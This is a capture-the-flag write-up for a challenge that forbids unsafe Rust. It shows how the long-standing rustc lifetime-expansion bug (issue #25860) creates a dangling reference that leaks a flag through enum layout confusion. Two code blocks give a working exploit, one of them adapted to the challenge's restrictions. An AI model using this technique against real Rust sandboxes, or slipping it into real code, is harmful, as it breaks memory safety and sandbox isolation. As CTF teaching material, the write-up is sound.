In this task much of Rust is banned: pretty much everything you get are the default types and basic assignment and calls. In Rust, you can't dereference a pointer without unsafe code, but you can't use unsafe code without a code block, so that's off limits.

Now, it should be quite obvious (especially with the description given) that you are supposed to use a bug in the compiler. As of writing this writeup, I'm aware of one such bug: the ancient lifetime expansion bug, [issue #25860](https://github.com/rust-lang/rust/issues/25860). You can find good implementation of it [here](https://github.com/Speykious/cve-rs/blob/main/src/lifetime_expansion.rs). The bug itself can be quite easily found by googling stuff about rustlang bugs.

As I haven't looked into other rustc bugs much, the task must be solvable in other ways, please tell me about your way if you found one!

The basic logic of the exploit is this:
```Rust
fn lifetime_translator<'a, 'b, T>(_: &'b &'a (), val: &'a T) -> &'b T {
    val
}

// this is the bug: the seemingly sound function above can be coerced into a function that converts an arbitrary lifetime into 'static.
let lifetime_expander: fn(&'static &(), &String) -> &'static String = lifetime_translator;

enum Converter {
    A(*const u8, u64), // if you look into the source (accessible directly from the docs!) you can find that the layout of String is actually this (ptr, len, ...) tuple, basically.
    B(String)
}

let mut conv = Converter::B(String::new());

let Converter::B(str_ref) = &conv else {
    unreachable!();
};

let str_ref = lifetime_expander(&&(), str_ref);

// not guaranteed to work, but in reality will usually just change the same memory as the str_ref is pointing to
conv = Converter::A(flag, 64);

println!("{}", str_ref);
```

Now you just need to make it fit the restrictions. This is done by using a closure, Result from the prelude and other tricks:
```Rust
let lifetime_translator: for<'a, 'b> fn(_: &'b &'a (), val: &'a String) -> &'b String = |_, x| x;
let lifetime_expander: fn(&'static &(), &String) -> &'static String = lifetime_translator;

let mut conv = Ok(0.to_string());

let str_ref = conv.as_ref().unwrap();

let str_ref = lifetime_expander(&&(), str_ref);

conv = Err((flag, 64u64));

conv.expect(str_ref);
```